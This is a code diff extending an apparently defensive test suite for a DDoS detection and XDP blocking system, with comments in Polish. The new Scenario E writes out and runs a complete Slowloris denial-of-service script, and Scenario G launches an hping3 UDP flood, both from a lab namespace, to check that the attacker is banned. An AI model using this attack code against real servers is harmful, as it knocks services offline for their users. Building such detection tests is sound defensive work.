@@ -83,6 +83,8 @@ def tail_logs_for_ban(target_ip, timeout=15):
                     if "[BAN]" in line and target_ip in line:
                         if "SYN flood" in line:
                             return "L4 SYN Flood", time.time() - start_time
+                        elif "UDP" in line:
+                            return "L4 UDP Flood", time.time() - start_time
                         elif "Heuristic" in line:
                             return "L7 Heuristic", time.time() - start_time
                         elif "GRU" in line:
@@ -162,6 +164,65 @@ def test_gru_stealth_syn():
     else:
         report("D: Low & Slow SYN", engine, ttm, f"{RED}FAIL{RESET}")
 
+def test_l7_slowloris():
+    print(f"\n{YELLOW}--- Scenario E: L7 Slowloris Attack ---{RESET}")
+    reset_environment()
+    
+    slowloris_script = "/tmp/slowloris_test.py"
+    
+    # Dynamiczne generowanie skryptu ataku dla namespace'a
+    with open(slowloris_script, "w") as f:
+        f.write("""import socket, random, time
+TARGET_IP = "10.0.0.1"
+PORT = 80
+SOCKET_COUNT = 150
+SLEEP_TIME = 10
+sockets = []
+
+def create_socket():
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(4)
+        s.connect((TARGET_IP, PORT))
+        s.send(f"GET /?rand={random.randint(0, 2000)} HTTP/1.1\\r\\n".encode("utf-8"))
+        s.send(f"Host: {TARGET_IP}\\r\\n".encode("utf-8"))
+        s.send("User-Agent: Slowloris-Testing\\r\\n".encode("utf-8"))
+        s.send("Accept-language: en-US,en,q=0.5\\r\\n".encode("utf-8"))
+        return s
+    except socket.error:
+        return None
+
+for _ in range(SOCKET_COUNT):
+    s = create_socket()
+    if s: sockets.append(s)
+
+while True:
+    for s in list(sockets):
+        try:
+            s.send(f"X-Keep-Alive: {random.randint(1, 5000)}\\r\\n".encode("utf-8"))
+        except socket.error:
+            sockets.remove(s)
+    for _ in range(SOCKET_COUNT - len(sockets)):
+        s = create_socket()
+        if s: sockets.append(s)
+    time.sleep(SLEEP_TIME)
+""")
+    
+    # Uruchomienie wygenerowanego skryptu wewnątrz attacker_ns
+    proc = run_cmd(f"python3 {slowloris_script}", ns=ATTACKER_NS, bg=True)
+    
+    # Slowloris potrzebuje czasu na wysycenie limitów i wyzwolenie detekcji. Dajemy max 35 sekund.
+    engine, ttm = tail_logs_for_ban(ATTACKER_IP, timeout=35)
+    proc.kill()
+    
+    is_dropped = is_ip_banned(ATTACKER_IP)
+    
+    # Zaliczamy test, jeśli atakujący został zablokowany (zazwyczaj przez L7 Heuristic lub GRU)
+    if engine != "None" and is_dropped:
+        report("E: L7 Slowloris", engine, ttm, f"{GREEN}PASS{RESET}")
+    else:
+        report("E: L7 Slowloris", engine, ttm, f"{RED}FAIL{RESET}")
+
 def test_benign_traffic():
     print(f"\n{YELLOW}--- Scenario F: Benign Baseline ---{RESET}")
     reset_environment()
@@ -178,6 +239,27 @@ def test_benign_traffic():
         report("F: Benign Traffic", "None", None, f"{GREEN}PASS{RESET}")
     else:
         report("F: Benign Traffic", engine, ttm, f"{RED}FAIL{RESET}")
+
+def test_l4_udp_flood():
+    print(f"\n{YELLOW}--- Scenario G: High-Rate L4 UDP Flood ---{RESET}")
+    reset_environment()
+    
+    # Narzędzie hping3 zalewa serwer pakietami UDP (--udp --flood)
+    # Atak ten jest całkowicie niewidoczny dla serwera Nginx!
+    proc = run_cmd(f"hping3 --udp -p 80 --flood {SERVER_IP}", ns=ATTACKER_NS, bg=True)
+    
+    # Dajemy systemowi 25 sekund. Jeśli nie ma sztywnej reguły UDP, 
+    # model GRU będzie potrzebował 15 sekund na analizę sekwencji.
+    engine, ttm = tail_logs_for_ban(ATTACKER_IP, timeout=25)
+    proc.kill()
+    
+    is_dropped = is_ip_banned(ATTACKER_IP)
+    
+    # Test zaliczony, jeśli jakikolwiek silnik podjął decyzję o blokadzie na poziomie XDP
+    if engine != "None" and is_dropped:
+        report("G: L4 UDP Flood", engine, ttm, f"{GREEN}PASS{RESET}")
+    else:
+        report("G: L4 UDP Flood", engine, ttm, f"{RED}FAIL{RESET}")
 
 def test_global_spoofed_syn():
     print(f"\n{YELLOW}--- Scenario H: Distributed Spoofed SYN Flood ---{RESET}")
@@ -246,7 +328,9 @@ def run_all():
     test_l7_http_flood()
     test_l7_error_flood()
     test_gru_stealth_syn()        # <-- Nowy test D
+    test_l7_slowloris()
     test_benign_traffic()
+    test_l4_udp_flood()
     test_global_spoofed_syn()
     test_mixed_traffic()          # <-- Nowy test I
     
